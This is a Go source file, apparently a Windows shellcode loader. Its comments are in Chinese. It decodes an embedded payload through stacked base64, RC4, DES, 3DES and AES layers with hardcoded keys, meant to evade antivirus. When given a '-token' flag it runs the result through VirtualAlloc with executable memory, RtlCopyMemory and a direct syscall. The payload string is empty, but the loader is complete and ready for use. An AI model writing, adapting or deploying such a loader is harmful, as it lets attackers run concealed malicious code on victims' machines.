package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/rc4"
	"encoding/base64"
	"flag"
	"log"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	//如果存在token参数就执行shellcode
	token bool

	//kernel32      = syscall.MustLoadDLL("kernel32.dll")
	//ntdll         = syscall.MustLoadDLL("ntdll.dll")
	//VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	//RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func checkErr(err error) {
	//如果内存调用出现错误，可以报错
	if err != nil {
		//如果调用dll系统发出警告，但是程序运行成功，则不进行警报
		if err.Error() != "The operation completed successfully." {
			//报出具体错误
			println(err.Error())
			os.Exit(1)
			log.Fatal(err)
		}
	}
}

func DesDecrypt(crypted, key []byte) ([]byte, error) {
	block, err := des.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode := cipher.NewCBCDecrypter(block, key)
	origData := make([]byte, len(crypted))
	// origData := crypted
	blockMode.CryptBlocks(origData, crypted)
	origData = PKCS5UnPadding(origData)
	// origData = ZeroUnPadding(origData)
	return origData, nil
}

// 3DES解密
func TripleDesDecrypt(crypted, key, iv []byte) ([]byte, error) {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode := cipher.NewCBCDecrypter(block, iv)
	origData := make([]byte, len(crypted))
	blockMode.CryptBlocks(origData, crypted)
	origData = PKCS5UnPadding(origData)
	return origData, nil
}

//AES解密
func AesDecryptCBC(encrypted []byte, key []byte) (decrypted []byte) {
	block, _ := aes.NewCipher(key)                              // 分组秘钥
	blockSize := block.BlockSize()                              // 获取秘钥块的长度
	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize]) // 加密模式
	decrypted = make([]byte, len(encrypted))                    // 创建数组
	blockMode.CryptBlocks(decrypted, encrypted)                 // 解密
	decrypted = PKCS5UnPadding(decrypted)                       // 去除补全码
	return decrypted
}
func PKCS5UnPadding(origData []byte) []byte {
	length := len(origData)
	// 去掉最后一个字节 unpadding 次
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

func runCode(code []byte) {
	// add
	VirtualAlloc := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAlloc")
	RtlCopyMemory := syscall.NewLazyDLL("ntdll.dll").NewProc("RtlCopyMemory")

	//调用VirtualAlloc为shellcode申请一块内存
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	//调用RtlCopyMemory来将shellcode加载进内存当中
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&code[0])), uintptr(len(code)))
	checkErr(err)
	//syscall来运行shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}
func main() {

	shellcode := ""
	encodestr := "des,rc4,aes,3des,base64"
	slice := strings.Split(encodestr, ",")
	//BASE64解码
	shell, err := base64.StdEncoding.DecodeString(shellcode)
	checkErr(err)
	for i := len(slice) - 2; i > -1; i-- {
		if strings.EqualFold(slice[i], "rc4") {
			key := []byte("momohk")
			cipher2, _ := rc4.NewCipher(key)
			cipher2.XORKeyStream(shell, shell)
		} else if strings.EqualFold(slice[i], "des") {
			//des解密
			shell, _ = DesDecrypt(shell, []byte("vikeryoo"))
		} else if strings.EqualFold(slice[i], "3des") {
			//3des解密
			shell, _ = TripleDesDecrypt(shell, []byte("123456789012345678901234"), []byte("yoooyooq"))
		} else if strings.EqualFold(slice[i], "aes") {
			//AES解密
			shell = AesDecryptCBC(shell, []byte("yoolaescbcuuyool"))
		}
		//fmt.Println(slice[i])
	}

	//fmt.Println(hex.EncodeToString(shell))
	//fmt.Println(len(os.Args))
	//loader.exe -token
	flag.BoolVar(&token, "token", false, "run shellcode")
	flag.Parse()
	if token {
		runCode(shell)
	}

}
